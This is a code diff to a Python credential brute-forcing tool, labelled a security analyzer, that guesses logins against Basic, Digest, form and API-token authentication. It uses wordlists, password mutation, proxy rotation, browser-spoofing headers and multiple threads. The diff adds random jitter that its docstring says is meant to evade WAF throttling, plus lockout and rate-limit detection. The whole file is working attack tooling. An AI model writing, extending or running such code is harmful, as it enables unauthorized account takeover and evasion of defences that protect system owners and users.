@@ -7,6 +7,8 @@ import json
 import re
 import threading
 import itertools
+import time
+import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 
@@ -60,6 +62,20 @@ def mutate_passwords(passwords):
                 
     return list(mutated)
 
+def apply_jitter(delay):
+    """Applies a random jitter delay to mimic human behavior and evade WAF throttling."""
+    if delay > 0:
+        actual_delay = delay + random.uniform(0, delay * 0.5)
+        time.sleep(actual_delay)
+
+def check_lockout(resp_text, status_code, lockout_keyword):
+    """Checks if a response indicates account lockout or rate limiting."""
+    if status_code == 429:
+        return True
+    if lockout_keyword and lockout_keyword.lower() in resp_text.lower():
+        return True
+    return False
+
 def get_request_proxies(proxy_pool, single_proxy):
     """Determines proxies to use for a specific request."""
     if proxy_pool and proxy_pool.proxies:
@@ -68,12 +84,13 @@ def get_request_proxies(proxy_pool, single_proxy):
         return {"http": single_proxy, "https": single_proxy}
     return None
 
-def test_basic_auth(session, target_url, path, username, password, proxy_pool, single_proxy, verbose=False):
-    """Tests HTTP Basic Authentication with proxy rotation."""
+def test_basic_auth(session, target_url, path, username, password, proxy_pool, single_proxy, delay=0, lockout_keyword=None, verbose=False):
+    """Tests HTTP Basic Authentication with proxy rotation and rate limiting."""
     url = f"{target_url.rstrip('/')}{path}"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
     
+    apply_jitter(delay)
     try:
         baseline = session.get(url, headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
         if baseline.status_code == 404:
@@ -83,7 +100,12 @@ def test_basic_auth(session, target_url, path, username, password, proxy_pool, s
         if not auth_challenged:
             return None
 
+        apply_jitter(delay)
         resp = session.get(url, auth=HTTPBasicAuth(username, password), headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
+        
+        if check_lockout(resp.text, resp.status_code, lockout_keyword):
+            print(f"[!] [LOCKOUT/WAF WARNING] Potential lockout or rate-limiting detected at {url} (Status: {resp.status_code})")
+
         if resp.status_code in [200, 204, 302] and resp.status_code != 401:
             return {
                 "username": username,
@@ -96,12 +118,13 @@ def test_basic_auth(session, target_url, path, username, password, proxy_pool, s
         pass
     return None
 
-def test_digest_auth(session, target_url, path, username, password, proxy_pool, single_proxy, verbose=False):
-    """Tests HTTP Digest Authentication with proxy rotation."""
+def test_digest_auth(session, target_url, path, username, password, proxy_pool, single_proxy, delay=0, lockout_keyword=None, verbose=False):
+    """Tests HTTP Digest Authentication with proxy rotation and rate limiting."""
     url = f"{target_url.rstrip('/')}{path}"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
     
+    apply_jitter(delay)
     try:
         baseline = session.get(url, headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
         if baseline.status_code == 404:
@@ -111,7 +134,12 @@ def test_digest_auth(session, target_url, path, username, password, proxy_pool, 
         if baseline.status_code != 401 or 'Digest' not in auth_header:
             return None
 
+        apply_jitter(delay)
         resp = session.get(url, auth=HTTPDigestAuth(username, password), headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
+        
+        if check_lockout(resp.text, resp.status_code, lockout_keyword):
+            print(f"[!] [LOCKOUT/WAF WARNING] Potential lockout or rate-limiting detected at {url} (Status: {resp.status_code})")
+
         if resp.status_code in [200, 204, 302] and resp.status_code != 401:
             return {
                 "username": username,
@@ -126,14 +154,15 @@ def test_digest_auth(session, target_url, path, username, password, proxy_pool, 
         pass
     return None
 
-def test_form_auth(session, target_url, username, password, user_field, pass_field, failure_keyword, proxy_pool, single_proxy, verbose=False):
-    """Tests HTML Form-Based Authentication with CSRF scraping and proxy rotation."""
+def test_form_auth(session, target_url, username, password, user_field, pass_field, failure_keyword, proxy_pool, single_proxy, delay=0, lockout_keyword=None, verbose=False):
+    """Tests HTML Form-Based Authentication with CSRF scraping, rate limiting, and lockout detection."""
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Content-Type": "application/x-www-form-urlencoded"
     }
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
 
+    apply_jitter(delay)
     try:
         get_resp = session.get(target_url, headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
         
@@ -154,6 +183,7 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
             **hidden_inputs
         }
 
+        apply_jitter(delay)
         resp = session.post(
             target_url,
             data=payload,
@@ -163,6 +193,9 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
             allow_redirects=True,
             verify=False
         )
+
+        if check_lockout(resp.text, resp.status_code, lockout_keyword):
+            print(f"[!] [LOCKOUT/WAF WARNING] Account lockout or rate-limit triggered for user '{username}' at {target_url} (Status: {resp.status_code})")
 
         is_success = False
         if resp.status_code in [200, 302, 303]:
@@ -190,8 +223,8 @@ def test_form_auth(session, target_url, username, password, user_field, pass_fie
 
     return None
 
-def test_api_token(session, target_url, token, header_format, proxy_pool, single_proxy, verbose=False):
-    """Tests API Token validation with proxy rotation."""
+def test_api_token(session, target_url, token, header_format, proxy_pool, single_proxy, delay=0, lockout_keyword=None, verbose=False):
+    """Tests API Token validation with rate limiting."""
     token_header_value = header_format.replace("{token}", token)
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -199,8 +232,13 @@ def test_api_token(session, target_url, token, header_format, proxy_pool, single
     }
     req_proxies = get_request_proxies(proxy_pool, single_proxy)
 
+    apply_jitter(delay)
     try:
         resp = session.get(target_url, headers=headers, proxies=req_proxies, timeout=5, allow_redirects=True, verify=False)
+        
+        if check_lockout(resp.text, resp.status_code, lockout_keyword):
+            print(f"[!] [LOCKOUT/WAF WARNING] API rate limit triggered at {target_url} (Status: {resp.status_code})")
+
         if resp.status_code in [200, 204]:
             return {
                 "username": "API-Token",
@@ -415,6 +453,9 @@ def run_analysis(args):
     elif args.proxy:
         print(f"[*] Using static proxy: {args.proxy}")
 
+    if args.delay > 0:
+        print(f"[*] Rate limiting active: Base delay {args.delay}s with randomized jitter.")
+
     session = requests.Session()
 
     if args.auth_type == "api-token":
@@ -425,7 +466,7 @@ def run_analysis(args):
 
         valid_credentials = []
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = [executor.submit(test_api_token, session, args.url, token, args.api_header, proxy_pool, args.proxy, args.verbose) for token in tokens]
+            futures = [executor.submit(test_api_token, session, args.url, token, args.api_header, proxy_pool, args.proxy, args.delay, args.lockout_keyword, args.verbose) for token in tokens]
             for future in as_completed(futures):
                 result = future.result()
                 if result:
@@ -467,11 +508,11 @@ def run_analysis(args):
         futures = []
         for task in tasks:
             if task[0] == 'basic':
-                futures.append(executor.submit(test_basic_auth, session, args.url, task[3], task[1], task[2], proxy_pool, args.proxy, args.verbose))
+                futures.append(executor.submit(test_basic_auth, session, args.url, task[3], task[1], task[2], proxy_pool, args.proxy, args.delay, args.lockout_keyword, args.verbose))
             elif task[0] == 'digest':
-                futures.append(executor.submit(test_digest_auth, session, args.url, task[3], task[1], task[2], proxy_pool, args.proxy, args.verbose))
+                futures.append(executor.submit(test_digest_auth, session, args.url, task[3], task[1], task[2], proxy_pool, args.proxy, args.delay, args.lockout_keyword, args.verbose))
             else:
-                futures.append(executor.submit(test_form_auth, session, args.url, task[1], task[2], args.user_field, args.pass_field, args.failure_keyword, proxy_pool, args.proxy, args.verbose))
+                futures.append(executor.submit(test_form_auth, session, args.url, task[1], task[2], args.user_field, args.pass_field, args.failure_keyword, proxy_pool, args.proxy, args.delay, args.lockout_keyword, args.verbose))
 
         for future in as_completed(futures):
             result = future.result()
@@ -482,7 +523,7 @@ def run_analysis(args):
     return valid_credentials
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Advanced Security Analyzer for Multiple Authentication Protocols with Wordlist Mutation")
+    parser = argparse.ArgumentParser(description="Advanced Security Analyzer for Multiple Authentication Protocols with Rate Limiting & Lockout Detection")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("--auth-type", choices=["basic", "form", "digest", "api-token"], default="basic", help="Authentication type to test")
     parser.add_argument("--users", default="usernames.txt", help="Path to usernames wordlist")
@@ -491,6 +532,8 @@ if __name__ == "__main__":
     parser.add_argument("--user-field", default="username", help="Form field name for username (Form Auth only)")
     parser.add_argument("--pass-field", default="password", help="Form field name for password (Form Auth only)")
     parser.add_argument("--failure-keyword", default="invalid", help="Keyword in response body indicating login failure (Form Auth only)")
+    parser.add_argument("--lockout-keyword", help="Keyword or phrase in response indicating account lockout or rate limiting")
+    parser.add_argument("--delay", type=float, default=0.0, help="Base delay in seconds between requests (adds human-like jitter)")
     parser.add_argument("--api-header", default="Bearer {token}", help="Header template for API tokens (API-Token Auth only)")
     parser.add_argument("--mutate", action="store_true", help="Enable intelligent wordlist mutation engine (casing, leetspeak, suffixes)")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads")
